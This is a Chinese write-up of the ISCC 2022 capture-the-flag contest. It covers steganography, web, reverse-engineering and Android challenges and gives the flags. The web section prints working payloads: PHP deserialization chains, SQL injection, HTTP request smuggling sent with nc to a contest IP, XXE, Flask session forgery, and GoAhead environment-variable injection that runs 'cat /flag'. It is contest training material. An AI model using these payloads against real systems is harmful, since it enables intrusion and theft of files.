注：本文所做题目时间和复现时间不一致，按照主办方每天中午更新flag，或许有不同
----------------------------------------

0x01 MISC
=========

单板小将苏翊鸣
-------

下载附件得到压缩包和图片  
修改高度

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b24732c00401f8ca1fb358ff98f90f2c280cd3f4.png)

扫码得到

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ff87658e2102430581e5230f792a7b7cf5e4e48b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-732a73ec45d5374dba5577ac7e50136f8c6a0a32.png)

所以密码为15942

得到

ISCC{beij-dbxj-2004}

降维打击
----

foremost分离

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d3853de6738097fb6f0c308a787108b2aa57e939.png)

zsteg对00000567进行分析，发现在b1,r,lsb,yx通道存在一张png

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-590e70f3ff2366722d2620dc1aa47b15d38d62b1.png)

分离得到

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-521e1469f25eb243212c13630d42c921ca75f527.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e21fcd966499f57c8433d917151887ab97f0bba9.png)

魔女文字对照得到flag

ISCC{RARC-ZQTX-EDKM}

藏在星空中的诗-1
---------

psd图片用ps打开，不透明度设为100%

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c1895ecfa283aaf51e8864a70b7b355d8d2677aa.png)

由图片可得顺序

1 3 5 2 4

然后

密码就是这些星星(个人没学过MISC，真心感觉有点脑残，仅个人观点（狗头）

RNM有的星星Ctrl+F都找不到

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e13b87304dc5831ea9470e5657a03401fa3116b6.png)

ISCC{CLUOLCDYZAWTFV}

真相只有一个
------

将png进行处理

```php
zsteg -a entity.png
```

在b1,rgb,lsb,xy通道得到一个文本

提取一下

```php
zsteg -E b1,rgb,lsb,xy entity.png &gt; out2.png
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-459ec7c0f1f589a787934fab830599ba656dd725.png)

对压缩包进行掩码爆破

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8ea7647f4e8c7b3d512b793a7cef3c743281e396.png)

解压后流量分析(stream+.zip里面的pcapng

发现password.mp3

并分离出来

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-32f3892001627c6eb4e09ffb125f88479f2b46f9.png)

得到

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4443e13e05b55d30f03ec51e91dba0df2fbbd42d.png)

```php
.. ... -.-. -.-. -- .. ... -.-.
```

得到  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fa40b643a7bba7b56121b16f5d674ada1c6d5693.png)

猜测是nsow隐写

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9c935eab29b44dba8c94dc788bdcd8b9618b9cdd.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c9c4066848b871a23485e5d2f66140d3f9510e55.png)

ISCC{4Pbq-e9h2-r8AM}

隐秘的信息
-----

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f79e15f712f364f01d20fbdb1fd2c2e5ffa9b64.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-11f00e0c8b76c5032ef6472faf1e38bbc401ff57.png)

十六进制转二进制

把空格消除

```python
#s tr1 = len('01100110011001000011001000110101001101000110010000110000011001000011000001100100011001010110010001100001001101010011000000111001011001000011010100111001001100000110010001100100001101010011000001100100011001000011010000111001001101100011000100110000011001000011001100110101001100100011100101100101001101010011100100110101001101010011000001100101001100010110010000111001011001000011000100110100001110010110001100110101011001100011011101100110011000110011000000110001011001100011100000110000001100000011011101100110')
str1 = '01100110 01100100 00110010 00110101 00110100 01100100 00110000 0110010000110000 01100100 01100101 01100100 01100001 00110101 00110000 0011100101100100 00110101 00111001 00110000 01100100 01100100 00110101 0011000001100100 01100100 00110100 00111001 00110110 00110001 00110000 0110010000110011 00110101 00110010 00111001 01100101 00110101 00111001 0011010100110101 00110000 01100101 00110001 01100100 00111001 01100100 0011000100110100 00111001 01100011 00110101 01100110 00110111 01100110 0110001100110000 00110001 01100110 00111000 00110000 00110000 00110111 01100110'.replace(' ','')

print str1
```

ASCII码的二进制表达，是从 0000 0000 开始，到 0111 1111 结束

得到

```php
01100110011001000011001000110101001101000110010000110000011001000011000001100100011001010110010001100001001101010011000000111001011001000011010100111001001100000110010001100100001101010011000001100100011001000011010000111001001101100011000100110000011001000011001100110101001100100011100101100101001101010011100100110101001101010011000001100101001100010110010000111001011001000011000100110100001110010110001100110101011001100011011101100110011000110011000000110001011001100011100000110000001100000011011101100110
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3714f6bfd029d1acdba3389188c8d207c30eadb.png)

ISCC{iBud7T7RXCMJyeT8vtRq}

0x02 WEB
========

冬奥会
---

```php
&lt;?php

show_source(__FILE__);

$Step1=False;
$Step2=False;

$info=(array)json_decode(@$_GET['Information']);

if(is_array($info)){

    var_dump($info);

    is_numeric(@$info["year"])?die("Sorry~"):NULL;
    if(@$info["year"]){
        ($info["year"]=2022)?$Step1=True:NULL;
    }
    if(is_array(@$info["items"])){
        if(!is_array($info["items"][1])OR count($info["items"])!==3 ) die("Sorry~");
        $status = array_search("skiing", $info["items"]);
        $status===false?die("Sorry~"):NULL;
        foreach($info["items"] as $key=&gt;$val){
            $val==="skiing"?die("Sorry~"):NULL;
        }
        $Step2=True;
    }
}

if($Step1 &amp;&amp; $Step2){
    include "2022flag.php";echo $flag;
}
```

当Step1和Step2都为True就输出flag

1、弱比较

2、数组长度为3，且第二个为数组，弱比较，遍历整个数组，其中skiing是强等于，所以只要数组中除了第二个有0即可

payload:

```php
Information={"year":"2022a","items":[1,[2],0]}

Information={"year":"2022a","items":[0,[2],1]}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1eca3b400514876feb1ab983b686878aa2b6fffa.png)

ISCC{W31com3\_T0\_Beijin9}

Pop2022
-------

源码：

```php
Happy New Year~ MAKE A WISH
&lt;?php

echo 'Happy New Year~ MAKE A WISH<br>';

if(isset($_GET['wish'])){
    @unserialize($_GET['wish']);
}
else{
    $a=new Road_is_Long;
    highlight_file(__FILE__);
}
/***************************pop your 2022*****************************/

class Road_is_Long{
    public $page;
    public $string;
    public function __construct($file='index.php'){
        $this-&gt;page = $file;
    }
    public function __toString(){
        return $this-&gt;string-&gt;page;
    }

    public function __wakeup(){
        if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this-&gt;page)) {
            echo "You can Not Enter 2022";
            $this-&gt;page = "index.php";
        }
    }
}

class Try_Work_Hard{
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);
    }
}

class Make_a_Change{
    public $effort;
    public function __construct(){
        $this-&gt;effort = array();
    }

    public function __get($key){
        $function = $this-&gt;effort;
        return $function();
    }
}
/**********************Try to See flag.php*****************************/
```

非常简单的构造，就不叙述过程了

exp：

```php
<?php
class Road_is_Long{
    public $page;
    public $string;
     function __construct($file='ki10Moc'){
        $this->page = $file;
    }
}

class Try_Work_Hard{
    protected $var='php://filter/read=convert.base64-encode/resource=flag.php';
}

class Make_a_Change{
    public $effort;
}

$a = new Road_is_Long();
$a->string = new Make_a_Change();
$a->string->effort = new Try_Work_Hard();
$b = new Road_is_Long($a);
echo urlencode(serialize($b));
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf7bc500a6dd46b437f09f380ec2a75beb5f8a43.png)

解码即可：

ISCC{P0p\_Zi\_aNd\_P1p\_Mei\_Da1ly\_life\_2022}

Easy-SQL
--------

?id=8 //出现回显，猜测可能是Mysql8

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-170f8a661871f3f66f45d65c51446f745da07754.png)

```php
?id=8 union table emails limit 8,1 --+
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-12acc214cafef5da713f3f29d64aa5724305d5f2.png)

访问压缩包下载

得到源码：

```php
<?php
include "./config.php";
// error_reporting(0);
// highlight_file(__FILE__);
$conn = mysqli_connect($hostname, $username, $password, $database);
   if ($conn->connect_errno) {
    die("Connection failed: " . $conn->connect_errno);
} 

echo "Where is the database?"."<br>";

echo "try ?id";

function sqlWaf($s)
{
    $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|"|\^|\||\ |\'/i';
    if (preg_match($filter,$s))
        return False;
    return True;
}

if (isset($_GET['id'])) 
{
    $id = $_GET['id'];
    $sql = "select * from users where id=$id";
    $safe = preg_match('/select/is', $id);
    if($safe!==0)
        die("No select!");
    $result = mysqli_query($conn, $sql);
    if ($result) 
    {
        $row = mysqli_fetch_array($result);
        echo "<h3>" . $row['username'] . "</h3><br>";
        echo "<h3>" . $row['passwd'] . "</h3>";
    }
    else
        die('<br>Error!');
}

if (isset($_POST['username']) && isset($_POST['passwd'])) 
{

    $username = strval($_POST['username']);
    $passwd = strval($_POST['passwd']);

    if ( !sqlWaf($passwd) )
        die('damn hacker');

    $sql = "SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        if ( $row['username'] === 'admin' && $row['passwd'] )
        {
            if ($row['passwd'] == $passwd)
            {
                die($flag);
            } else {
                die("username or passwd wrong, are you admin?");
            }
        } else {
            die("wrong user");
        }
    } else {
        die("user not exist or wrong passwd");
    }
}
mysqli_close($conn); 
?>
```

这里之前可以判断一共是3列

三列内容：id，username，password

满足username=admin并且password=password

```php
username=-1' union values row("admin","admin","ki10Moc")#&passwd=ki10Moc
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-306a9ef4511595b3f891ca4164e8d527729ce740.png)  
ISCC{Fdsfs219\_19FdFasVEsd0f158\_T0o\_SFFsd12156fs\_m1}

让我康康！

发现提示Try flag

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-34cf2f2d01f5868ebe02ac164efac4db53bc92b9.png)

但是无查询结果

发现服务器是gunicorn20.0.0

想到请求走私

[gunicorn 20.0.4 请求走私漏洞简析（含复现环境&amp;Poc）-Linux实验室 (linuxlz.com)](https://www.linuxlz.com/aqld/2359.html)

直接打

```php
echo -en "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 123\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /fl4g HTTP/1.1\r\nHost: 127.0.0.1/fl4g\r\nX-Forwarded-For: 127.0.0.1\r\nsecr3t_ip: 127.0.0.1\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc 59.110.159.206 7020
```

这里的字段是回显的提示，但是复现的时候环境崩了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ad6d287b5f19ae86330f88230a6d3dece1bffc6b.png)

ISCC{AWEIweiwwwweeeiii\_JJj9JJGg5GGG\_NONONONO2022}

findme
------

[浅析PHP原生类 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/264823)

```php
<?php
highlight_file(__FILE__);

class a{
    public $un0;
    public $un1;
    public $un2;
    public $un3;
    public $un4;

    public function __destruct(){
        if(!empty($this->un0) && empty($this->un2)){
            $this -> Givemeanew();
            if($this -> un3 === 'unserialize'){
                $this -> yigei();
            }
            else{
                $this -> giao();
            }
        }
    }

    public function Givemeanew(){
        $this -> un4 = new $this->un0($this -> un1);
    }

    public function yigei(){
        echo 'Your output: '.$this->un4;
    }

    public function giao(){
        @eval($this->un2);
    }

    public function __wakeup(){
        include $this -> un2.'hint.php';
    }
}

$data = $_POST['data'];
unserialize($data);
```

其中我在文章这里提到的一个小trick

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5e2028e039c025a6e19f579570934dcd4688d783.png)

再来看看源码，此处可以实现原生类的自声明和调用

```php
$this -> un4 = new $this->un0($this -> un1);
```

\_\_wakeup()中可以查看hint.php，那就先看一下hint.php

当然这是我最开始的写法，挺麻烦的，应该不是出题人的意思

```php
<?php

class a
{
    public $un0 = 'SplFileObject';
    public $un1 = 'php://filter/read=convert.base64-encode/resource=hint.php';
    public $un2;
    public $un3 = 'unserialize';
    public $un4;

}

echo serialize(new a());
```

按照出题人的意思应该这么写

```php
<?php

class a
{
    public $un0;
    public $un1;
    public $un2 = 'php://filter/read=convert.base64-encode/resource=';
    public $un3;
    public $un4;

}

echo serialize(new a());
```

这样就可以直接读取hint.php，不需要去看前面的if，直接执行的

得到信息

```php
<?php$a = 'flag在当前目录下以字母f开头的txt中,无法爆破出来';
```

下面就是找这样的文件

可以用[Directorylterator](https://www.php.net/manual/zh/class.directoryiterator.php)也可以用[Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php)

当然最好是使用[Globlterator](https://www.php.net/manual/zh/class.globiterator.php)，行为类似glob()

在网上看到的一些在[Globlterator](https://www.php.net/manual/zh/class.globiterator.php)下依然使用glob协议去读文件就挺….没必要的

```php
<?php

class a
{
    public $un0 = 'GlobIterator';
    public $un1 = 'f*.txt';
    public $un2;
    public $un3 = 'unserialize';
    public $un4;

}

echo serialize(new a());
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3e99468927bdbe9302834c5a0e4e06db10c50fa7.png)

那最后再去读这个文件即可

```php
<?php

class a
{
    public $un0 = 'SplFileObject';
    public $un1 = 'fSSSbis19k_sdW15dMe.txt';
    public $un2;
    public $un3 = 'unserialize';
    public $un4;

}

echo serialize(new a());
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-92b2150244999f66f353f0062ad93e4e03484b35.png)

ISCC{DS19sdw\_SssfDA10nK\_2077yyyyNNNN}

### 这是一道代码审计题

/index访问，login改成1

得到emoji

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ea07ebbac5afd29acf6734d9b5f5c6096060842b.png)

base100解码得到

源码：

```python
def geneSign():
    if(control_key==1):
        return render_template("index.html")
    else:
        return "You have not access to this page!"
def check_ssrf(url):
    hostname = urlparse(url).hostname
    try:
        if not re.match('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
            if not re.match('https?://@(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
                raise BaseException("url format error")
        if  re.match('https?://@(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
            if judge_ip(hostname):
                return True
            return False, "You not get the right clue!"
        else:
            ip_address = socket.getaddrinfo(hostname,'http')[0][4][0]
            if is_inner_ipaddress(ip_address):
                return False,"inner ip address attack"
            else:
                return False, "You not get the right clue!"
    except BaseException as e:
        return False, str(e)
    except:
        return False, "unknow error"
def ip2long(ip_addr):
    return struct.unpack("!L", socket.inet_aton(ip_addr))[0]
def is_inner_ipaddress(ip):
    ip = ip2long(ip)
    print(ip)
    return ip2long('127.0.0.0') >> 24 == ip >> 24 or ip2long('10.0.0.0') >> 24 == ip >> 24 or ip2long('172.16.0.0') >> 20 == ip >> 20 or ip2long('192.168.0.0') >> 16 == ip >> 16 or ip2long('0.0.0.0') >> 24 == ip >> 24
def waf1(ip):
    forbidden_list = [ '.', '0', '1', '2', '7']
    for word in forbidden_list:
        if ip and word:
            if word in ip.lower():
                return True
    return False
def judge_ip(ip):
    if(waf1(ip)):
        return Fasle
    else:
        addr = addr.encode(encoding = "utf-8")
        ipp = base64.encodestring(addr)
        ipp = ipp.strip().lower().decode()
        if(ip==ipp):
            global control_key
            control_key = 1
            return True
        else:
            return False
```

目的是要绕过judge\_ip并且ip=ipp

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bc08d0d624ab2232e81eedd2104739a7aaf32220.png)  
mti3ljaumc4x

替换cookie

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e500499d75f9182124a5362c378afabb600dede4.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-020ecb42ba901c5d3f4d90c067b0fb5871d93eba.png)

/mti3ljaumc4x请求，可以看到ajax，xml

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7e1e76f74892bb121cd0db990a470e71638261fd.png)

并且在title处可以看到flag.txt

```html
<html>
<head>
    <title>./flag.txt</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <script type="text/javascript">
function codelogin(){
    var name = $("#name").val();
    var password = $("#password").val();
    if(name == "" || word == ""){
        alert("Please enter the username and password!");
        return;
    }

    var data = "<user><name>" + name + "</name><password>" + password + "</password></user>";
    $.ajax({
        contentType: "application/xml;charset=utf-8",
        type: "POST",
        url: "codelogin",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
            var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
            var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
            if(code == "0"){
                $(".msg").text(msg + " login fail!");
            }else if(code == "1"){
                $(".msg").text(msg + " login success!");
            }else{
                $(".msg").text("error:" + msg);
            }
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    });
}
</script>
</head>

<body>
     <form>
     <div  id="loginFormMain">
         <table  style="width:468px;height:262px;background-color: gray;text-align: center;">
              <tr>
                 <th colspan="2" align="center" >登录</th>
              </tr>
              <tr>
                  <td>用户名:<input id="name" type="text" style="width: 200px;height: 30px;"  name="name"></td>
              </tr>
              <tr>
                  <td>密  码:<input id="password" type="password"  style="width: 200px;height: 30px;"  name="password"></td>
              </tr>
              <tr>
                  <td align="center" ><input type="button" style="cursor: pointer;font-style: inherit;" name="next"  value="login" οnclick="javascript:codelogin()" />

              </tr>
         </table>
     </div>
      </form>
</body>
</html>
```

在codelogin方法中

定义了请求方式和请求的数据，数据就是data，直接抄下来

xxe构造一下

```php

]>
<user><name>
    &ki10Moc;
    </name>
<password>password
</password></user>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6043a35299b860e169281160ae1c303e23cd210.png)

ISCC{jQvb8-aqQxRlOpBVtrX19-0579i8c-ew08Sq0xf}

### 爱国敬业好青年-2

题目一般靠猜，一半靠蒙

反正就是天安门广场

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-64447ad1c9718af60f06ce0308bbaed985799885.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18e34e9117ec65d0bff9452e9b47fb99d37e7c48.png)

三个页面 info flag change

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-484d2e0aba53672a6e99d42794b6510327b71b3a.png)

```php
116.41021
39.92267
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4261ddcea60307bc848a2c8d78ec369502274345.png)

```php
116°24′E
39°55'N
```

但这样得到的并不对

应该可能是数据有偏差

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e5c6400caa30f0902f9aee32719008e5b678a905.png)

经过测试后修改下数据

```php
116°23′E
39°54'N
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d7f6517fad40c6dd689a4bed8b64eb74386b4a11.png)

ISCC{w179Qxxs\_1QvPlNmSzX08vE\_a18s\_1q1846NO}

0x03 REVERSE
============

Amy's Code
----------

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe7c6f4dae7bc28e9f717b2f320baaed1ca00262.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5aba626e00e184447a2477497e2ac9d49f4aad9c.png)

v4的值付给v3传入sub\_4115FF

之后给sub\_411433运算

exp：

```python
str1 = [149,169,137,134,212,188,177,184,177,197,192,179,153,172,152,123,164,193,113,184]
str2 = [76,87,72,70,85,69,78,71,68,74,71,69,70,72,89,68,72,73,71,74]
code = []
flag =''
str_len = len(str2)
for i in range(str_len):
    code.append(str1[i]-str2[i])
print(code)
for i in range(str_len):
    flag += chr(code[i] ^ i)
print(flag)

//[73, 82, 65, 64, 127, 119, 99, 113, 109, 123, 121, 110, 83, 100, 63, 55, 92, 120, 42, 110]
```

ISCC{reverse\_i18Li8}

0x04 MOBILE
===========

MOBILEA
-------

全局搜索关键字iscc

首先来看下Jlast函数

```java
private boolean Jlast(String str) {
        try {
            MessageDigest instance = MessageDigest.getInstance("MD5");
            new encode.BASE64Encoder();
            String encode = encode.BASE64Encoder.encode(instance.digest(str.getBytes("utf-8")));
            if (encode.length() != 24) {
                return false;
            }
            char[] cArr = new char[encode.length()];
            boolean z = false;
            int i = 0;
            for (int i2 = 5; i2 >= 0; i2--) {
                if (!z) {
                    for (int i3 = 3; i3 >= 0; i3--) {
                        cArr[i] = encode.charAt((i3 * 6) + i2);
                        i++;
                    }
                    z = true;
                } else {
                    for (int i4 = 0; i4 <= 3; i4++) {
                        cArr[i] = encode.charAt((i4 * 6) + i2);
                        i++;
                    }
                    z = false;
                }
            }
            if (String.valueOf(cArr).equals("=IkMBb+=gF2/Try5PCUruw1j")) {
                return true;
            }
```

将内容逆回去

```java
package mobile;

public class k {
    public static void main(String[] args) {

        char[] cArr = new char[24];
        String a = "=IkMBb+=gF2/Try5PCUruw1j";
        boolean z = false;
        int i = 0;
        for (int i2 = 5; i2 >= 0; i2--) {
            if (!z) {
                for (int i3 = 3; i3 >= 0; i3--) {
                    cArr[(i3 * 6) + i2] = a.charAt(i);
                    i++;
                }
                z = true;
            } else {
                for (int i4 = 0; i4 <= 3; i4++) {
                    cArr[(i4 * 6) + i2] = a.charAt(i);
                    i++;
                }
                z = false;
            }
        }
        System.out.println(cArr);
    }
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-857ab49658cb4b4d926157957d8885db13811db9.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c42510df1fc0438a3aeb02b5bc28a2c77b44d4eb.png)

MD5解密

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cc3c09d5639d504cfc3eaf154fbeaac220c9d9b8.png)

得到\_到}的内容

再来看AES的部分

```java

                try {
                    byte[] bytes = new String(Base64.encode("K@e2022%%y".getBytes(StandardCharsets.UTF_8), 0)).replace("\n", "").getBytes(StandardCharsets.UTF_8);
                    byte[] bytes2 = new String(Base64.encode("I&V2022***".getBytes(StandardCharsets.UTF_8), 0)).replace("\n", "").getBytes(StandardCharsets.UTF_8);
                    byte[] bytes3 = str.substring(5, i).getBytes(StandardCharsets.UTF_8);
                    SecretKeySpec secretKeySpec = new SecretKeySpec(bytes, "AES");
                    IvParameterSpec ivParameterSpec = new IvParameterSpec(bytes2);
                    Cipher instance = Cipher.getInstance("AES/CBC/PKCS7Padding");
                    instance.init(1, secretKeySpec, ivParameterSpec);
                    if (new String(Base64.encode(Base64.encodeToString(instance.doFinal(bytes3), 2).getBytes(StandardCharsets.UTF_8), 0)).replace("\n", "").equals("ZHNGazZsRGM1MXZ4VnQ1bUdadEptNDJaUkVqY2lyOFlQcEhEUGs5cDJxWT0=")) {
                        return true;
                    }
                    return false;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
```

这里可以得到秘钥和偏移量

将内容（ZHNGazZsRGM1MXZ4VnQ1bUdadEptNDJaUkVqY2lyOFlQcEhEUGs5cDJxWT0=）base64解密后

拿去解密即可得到{后到\_的内容

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9dd0ca3802341959ad853b769d974270b6b9f331.png)

和leaf组合起来就是

ISCC{JFV(\*&amp;TFVcfgtyui\_leaf}

擂台
==

0x01 MISC
=========

666
---

08→00

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b01079de829a0091733ff7b950f0130115bb6a98.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7679fae9f6003730ffb2611a547608c68d5ba2ef.png)

新的图片修改高度

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1323efbf391cfe8549020df2b7a7a700a3b7ae1b.png)

得到密码 !@#$%678()\_+

流量分析

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-aa8ba47f584ae932f3ad322a5984e10039bb241c.png)

[](https://www.cnblogs.com/konglingdi/p/14998301.html)<https://www.cnblogs.com/konglingdi/p/14998301.html>

得到gif图片

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a63879f2b6cffa7a7d9d4635d8b92ed8c4189111.png)

第六帧出现

SE1ERWt1eTo4NTIgOTg3NDU2MzIxIDk4NDIzIDk4NDIzIFJFQUxrZXk6eFN4eA==

第十六帧出现

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-298f2b98e78a787c8b42e8cff5ccf5a7b6281604.png)

pQLKpP/

第二十六帧出现

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5de2c046a1ca1c7abdb40a3772b36f433ac4cdb0.png)

EPmw301eZRzuYvQ==

九键密码

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-eef01c8993370463d24f403c82253f0364174607.png)

aes解密得到flag  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-0fc133b543a30033aecee2bcbdbed6781c0d297b.png)

ISCC{lbwmeiyoukaig}

0x02 WEB
========

Melody
------

~本人信息收集能力很弱~能得到的信息很少

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-0aa044f0bc4bc33738ebba2e6e6e27b3ec26ef18.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c8c5bfae235a45cb3a6d2b5c4421473289886212.png)  
给了参数

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7a99ba03218b2178b961c0f7b017d854db0d6cfa.png)

看下配置文件(框架是flask的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e9fa3855adbfc337b73cbc06eb14889b7828c059.png)

查找关键字秘钥

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-82c67752f4f88d0ae363c6f4ea6f54c235889f4c.png)

秘钥：

meldoy-is-so-cute-wawawa!

伪造一下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3b687419fde8a8be4689b227a2f367b078362326.png)

```python
eyJ1c2VybmFtZSI6ImFkbWluIn0.YnHhUw.Doua6BXcMvBlLiF30ytOcDVBqZQ
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b246ff86c4707e360289be7128faf5efa31e0b6f.png)

没有flag

F12

源码如下：

```python
# -*- coding:utf-8 -*-
import pickle
import melody
import base64
from flask import Flask, Response,request

class register:
    def __init__(self,name,password):
        self.name = name
        self.password = password

    def __eq__(self, other):
        return type(other) is register and self.name == other.name and self.password == other.password

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module[0:8] == '__main__':
            return getattr(sys.modules['__main__'],name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))

def find(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

@app.route('/therealflag', methods=['GET','POST'])
def realflag():
    if request.method == 'POST':
        try:
            data = request.form.get('melody')
            if b'R' in base64.b64decode(data):
                return 'no reduce'
            else:
                result = find(base64.b64decode(data))
                if type(result) is not register:
                    return 'The type is not correct!'
            correct = ((result == register(melody.name,melody.password))&(result == register("melody","hug")))
            if correct:
                if session['username'] == 'admin':
                    return Response(read('./flag.txt'))
                else:
                    return Response("You're not admin!")
        except Exception as e:
            return Response(str(e))

    test = register('admin', '123456')
    data = base64.b64encode(pickle.dumps(test)).decode()
    return Response(data)

```

看下逻辑，在therealflag路由下，使用用户melody，密码hug注册就会返回flag

这里还需要对内容序列化，R操作码被ban了

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2022/5/4 19:40
# @Author  : ki10Moc
# @FileName: exp.py
# @Software: PyCharm
# Link: ki10.top
import pickle
import base64

class register:
    def __init__(self,name,password):
        self.name = name
        self.password = password

    def __eq__(self, other):
        return type(other) is register and self.name == other.name and self.password == other.password

result = register("melody","hug")
a = pickle.dumps(result)
print(base64.b64encode(a))
```

melody传参，在therealflag路由下操作即可

ISCC{2022\_melody\_secrets}

ping2rce
--------

寒假看到P牛发的GoAhead的PDF，当时就瞟了一眼，然后坐牢半天，早知道当时就好好复现了呜呜呜

[GoAhead环境变量注入复现踩坑记 - 跳跳糖 (tttang.com)](https://tttang.com/archive/1399/)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9ec523cab2b60d39daa3568a2875bfab8d3980d3.png)

只需要这两个部分替换，发送一个multipart数据包，通过表单来注入环境变量

```php
POST /cgi-bin/ping?ip=0.0.0.0 HTTP/1.1
Host: 59.110.159.206:8010
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM
Content-Length: 190

------WebKitFormBoundarylNDKbe0ngCGdEiPM
Content-Disposition: form-data; name="BASH_FUNC_ping%%"
Content-Type: text/plain

() { cat /flag; }
------WebKitFormBoundarylNDKbe0ngCGdEiPM--
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9651b62ddcf6402e47c198fc0b2acc7173327701.png)

